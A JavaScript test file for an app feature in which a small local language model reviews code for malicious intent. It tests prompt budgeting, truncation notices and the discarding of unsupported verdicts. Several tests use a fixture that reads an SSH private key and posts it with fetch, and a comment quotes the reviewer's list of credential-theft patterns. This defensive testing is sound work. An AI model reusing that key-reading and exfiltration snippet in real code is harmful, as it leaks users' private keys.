'use strict';

// The security review has to fit its prompt, the code and its own generation
// inside one context window. Sizing the parts independently overran the 0.6B
// model's 1024 tokens, and an overrun prompt came back as unparseable output.

const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const test = require('brittle');

// Same technique as chat-security-deadline: chat.cjs reads os.homedir() at lookup time.
const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'chat-budget-test-'));
os.homedir = function stubbedHomedir() { return path.join(tmpRoot, 'fakehome'); };

const chatPath = require.resolve('../../electron/chat.cjs');
const sdkPath = require.resolve('@qvac/sdk');

// The 0.6B preset is the one pickDefaultChatModel reaches for first. Every
// preset gets the same window, the ctx_size ensureLoaded asks the addon for.
const SMALL_MODEL = 'Qwen3-0.6B-Q4_0.gguf';
const MODEL_WINDOW = 4096;
const approxTokens = (text) => Math.ceil(text.length / 4);

function freshChat(seen) {
  delete require.cache[sdkPath];
  delete require.cache[chatPath];
  const stub = {
    QWEN3_600M_INST_Q4: { name: 'Qwen3-0.6B-Q4_0' },
    loadModel: async () => 'model-1',
    unloadModel: async () => undefined,
    getLoadedModelInfo: async () => { throw new Error('not configured in this test'); },
    completion: ({ history, generationParams }) => {
      seen.history = history;
      seen.generationParams = generationParams;
      return {
        events: (async function* stream() {
          yield { type: 'contentDelta', text: seen.reply ?? '{"verdict":"clean","concerns":[]}' };
        })(),
      };
    },
  };
  require.cache[sdkPath] = { exports: stub, id: sdkPath, filename: sdkPath, loaded: true, children: [], paths: [] };
  return require(chatPath);
}

async function review({ code, lessonReference, reply }) {
  const seen = { reply };
  const chat = freshChat(seen);
  await chat.load(SMALL_MODEL);
  const outcome = await chat.runSecurityScan({
    code,
    lessonKey: null,
    lessonReference,
    modelHint: undefined,
    timeoutMs: 5_000,
  });
  const sent = seen.history.map((m) => approxTokens(m.content)).reduce((a, b) => a + b, 0);
  return { seen, outcome, sent, predict: seen.generationParams.predict };
}

test('chat-security-budget - prompt plus generation stays inside the window', async (t) => {
  const long = await review({ code: 'const x = 1;\n'.repeat(2000), lessonReference: 'ref '.repeat(4000) });
  t.ok(long.sent + long.predict <= MODEL_WINDOW, `${long.sent} + ${long.predict} fits ${MODEL_WINDOW}`);

  const short = await review({ code: 'console.log(1)\n', lessonReference: 'ref '.repeat(4000) });
  t.ok(short.sent + short.predict <= MODEL_WINDOW, `${short.sent} + ${short.predict} fits ${MODEL_WINDOW}`);
});

test('chat-security-budget - the code claims its room before the lesson reference', async (t) => {
  const code = 'const x = 1;\n'.repeat(40);
  const { seen, outcome } = await review({ code, lessonReference: 'ref '.repeat(4000) });
  const user = seen.history.find((m) => m.role === 'user').content;

  t.ok(user.includes(code), 'the whole file is in the prompt');
  t.absent(outcome.truncated, 'and nothing was reported as cut');
});

test('chat-security-budget - code past the window is cut and the cut is declared', async (t) => {
  const code = 'const x = 1;\n'.repeat(2000);
  const { seen, outcome } = await review({ code, lessonReference: null });
  const user = seen.history.find((m) => m.role === 'user').content;

  t.ok(outcome.truncated, 'the caller is told the review was partial');
  t.ok(/was NOT reviewed/.test(user), 'and so is the model, rather than reading a fragment as the whole file');
});

test('chat-security-budget - the review asks Qwen3 not to spend the budget thinking', async (t) => {
  const { seen } = await review({ code: 'console.log(1)\n', lessonReference: null });
  const user = seen.history.find((m) => m.role === 'user').content;
  t.ok(user.trimEnd().endsWith('/no_think'), 'the switch is the last thing the model reads');
});

test('chat-security-budget - a long file buys room from the answer and the instructions', async (t) => {
  const short = await review({ code: 'const x = 1;\n'.repeat(10), lessonReference: null });
  const long = await review({ code: 'const x = 1;\n'.repeat(1100), lessonReference: null });

  const systemOf = (r) => r.seen.history.find((m) => m.role === 'system').content;
  t.ok(long.predict < short.predict, 'the answer budget gives way first');
  t.ok(systemOf(long).length < systemOf(short).length, 'then the instructions shorten');
  t.ok(
    long.seen.history.find((m) => m.role === 'user').content.includes('const x = 1;\n'.repeat(1100)),
    'and the whole file fits where it would not have before',
  );
});

test('chat-security-budget - a passing verdict carries no concerns whatever the model says', async (t) => {
  const { outcome } = await review({
    code: 'console.log(1)\n',
    lessonReference: null,
    reply: '{"verdict":"clean","concerns":[{"summary":"The code is fine and has no bad intent.","snippet":"x"}]}',
  });
  t.alike(outcome.result.concerns, [], 'the reassurance is dropped, never printed as a warning');
});

// The 0.6B read the prompt's own "look specifically for" list back as its
// finding and refused a working MCP lesson in the reviewer's own words.
test('chat-security-budget - a verdict quoting nothing in the code is dropped', async (t) => {
  const parroted = 'The code contains malicious activities such as reading or exfiltrating credentials, '
    + 'environment variables, SSH keys, or other secrets; destructive filesystem operations.';
  const { outcome } = await review({
    code: 'const modelId = await loadModel({ modelSrc: QWEN3_1_7B_INST_Q4 });\n',
    lessonReference: null,
    reply: JSON.stringify({ verdict: 'malicious', concerns: [{ summary: parroted, snippet: '' }] }),
  });

  t.is(outcome.result.verdict, 'clean', 'an accusation pointing at nothing does not stand');
  t.alike(outcome.result.concerns, [], 'and its wording is not shown as a reason');
});

test('chat-security-budget - a verdict quoting the real code survives', async (t) => {
  const code = 'const key = readFileSync("/Users/me/.ssh/id_rsa", "utf8");\nawait fetch(url, { body: key });\n';
  const { outcome } = await review({
    code,
    lessonReference: null,
    reply: JSON.stringify({
      verdict: 'malicious',
      concerns: [{ summary: 'reads an SSH private key and posts it', snippet: 'readFileSync("/Users/me/.ssh/id_rsa"' }],
    }),
  });

  t.is(outcome.result.verdict, 'malicious', 'the verdict stands');
  t.is(outcome.result.concerns.length, 1, 'with the concern behind it');
});

// Reformatting the quote is the model paraphrasing whitespace, not inventing.
test('chat-security-budget - evidence survives the model reindenting its quote', async (t) => {
  const { outcome } = await review({
    code: 'const key = readFileSync(\n  "/Users/me/.ssh/id_rsa",\n);\n',
    lessonReference: null,
    reply: JSON.stringify({
      verdict: 'suspicious',
      concerns: [{ summary: 'reads an SSH key', snippet: 'readFileSync( "/Users/me/.ssh/id_rsa", );' }],
    }),
  });
  t.is(outcome.result.verdict, 'suspicious', 'whitespace does not decide whether evidence counts');
});
